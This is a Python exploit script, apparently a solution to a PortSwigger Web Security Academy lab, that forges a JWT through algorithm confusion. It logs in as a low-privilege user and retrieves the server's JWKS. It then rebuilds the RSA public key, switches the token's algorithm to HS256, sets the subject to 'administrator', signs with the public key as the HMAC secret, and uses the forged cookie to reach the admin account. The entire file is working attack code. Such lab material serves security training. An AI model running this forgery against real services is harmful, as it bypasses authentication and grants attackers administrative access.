import base64
import http.client
import json
import re
import ssl
import urllib.parse

import jwt as pyjwt
from cryptography.hazmat.primitives._serialization import Encoding
from cryptography.hazmat.primitives._serialization import PublicFormat
from cryptography.hazmat.primitives.asymmetric import rsa

LAB_ID = '???'


def GET_login() -> http.client.HTTPResponse:
    method, path = 'GET', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, ''.encode('utf-8'), headers)
    return connection.getresponse()


def POST_login(
        csrf: str,
) -> http.client.HTTPResponse:
    method, path = 'POST', '/login'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'content-type': 'application/x-www-form-urlencoded',
        'origin': f'https://{LAB_ID}.web-security-academy.net',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'te': 'trailers',
    }
    fields = {
        'csrf': csrf,
        'username': 'wiener',
        'password': 'peter',
    }
    body = urllib.parse.urlencode(fields)
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, body, headers)
    return connection.getresponse()


def GET_jwks() -> http.client.HTTPResponse:
    method, path = 'GET', '/jwks.json'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
    }
    connection = http.client.HTTPSConnection('localhost', 27001, context=ssl._create_unverified_context())
    connection.set_tunnel(host, port)
    connection.request(method, path, "", headers)
    return connection.getresponse()


def GET_myaccount(
        session: str,
        username: str,
) -> http.client.HTTPResponse:
    method, path = 'GET', '/my-account'
    host, port = f'{LAB_ID}.web-security-academy.net', 443
    query_params = [
        ('id', username),
    ]
    headers = {
        'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
        'accept-language': 'en-US,en;q=0.5',
        'referer': f'https://{LAB_ID}.web-security-academy.net/login',
        'cookie': f'session={session}',
        'upgrade-insecure-requests': '1',
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origin',
        'sec-fetch-user': '?1',
        'priority': 'u=1',
        'te': 'trailers',
    }
    body = ''
    headers['Content-Length'] = str(len(body))
    connection = http.client.HTTPSConnection(host, port, context=ssl._create_unverified_context())
    connection.request(method, f"{path}?{urllib.parse.urlencode(query_params)}", body, headers)
    return connection.getresponse()


def login_csrf() -> str:
    response = GET_login()
    csrf = re.findall(r'name="csrf" value="([a-zA-Z0-9]+)"', response.read().decode('utf-8'))[0]
    return csrf


def login_session() -> str:
    csrf = login_csrf()
    response = POST_login(csrf)
    cookie_header = response.getheader('set-cookie')
    return re.findall(r'session=([a-zA-Z0-9._-]+);', cookie_header)[0]


jwt = login_session()

jwt_header = json.loads(base64.b64decode(jwt.split('.')[0] + '=='))
jwt_header["alg"] = "HS256"

jwt_payload = json.loads(base64.b64decode(jwt.split('.')[1] + '=='))
jwt_payload['sub'] = 'administrator'

jwks = GET_jwks().read().decode()
jwks = json.loads(jwks)
pub_key = next(filter(lambda x: x['kid'] == jwt_header['kid'], jwks['keys']), None)
if pub_key is None:
    print(f"could not find key with kid {jwt_header['kid']} in jwks.json")
print("pub key:")
print(pub_key)
print()

e = int.from_bytes(base64.urlsafe_b64decode(pub_key['e'] + '=='), "big")
n = int.from_bytes(base64.urlsafe_b64decode(pub_key['n'] + '=='), "big")
print("e: " + base64.urlsafe_b64encode(e.to_bytes(
    length=(e.bit_length() + 7) // 8,
    byteorder="big",
)).decode())
print("n: " + base64.urlsafe_b64encode(n.to_bytes(
    length=(n.bit_length() + 7) // 8,
    byteorder="big",
)).decode())
pub_key = rsa.RSAPublicNumbers(e=e, n=n).public_key()
pub_key = pub_key.public_bytes(
    format=PublicFormat.SubjectPublicKeyInfo,
    encoding=Encoding.PEM,
).decode('utf-8')
hacked_jwt = pyjwt.encode(
    jwt_payload,
    pub_key,
    headers=jwt_header,
)
print(hacked_jwt)
response = GET_myaccount(session=hacked_jwt, username='administrator')
if response.status == 302 and response.headers['location'] == '/login':
    print("incorrect hacked token")
    exit(1)
print(f"response status: {response.status}")
for name, header in response.headers.items():
    print(f"{name}: {header}")
print()
print("hacked token trial successful!")
print("session cookie to copy:")
print(hacked_jwt)
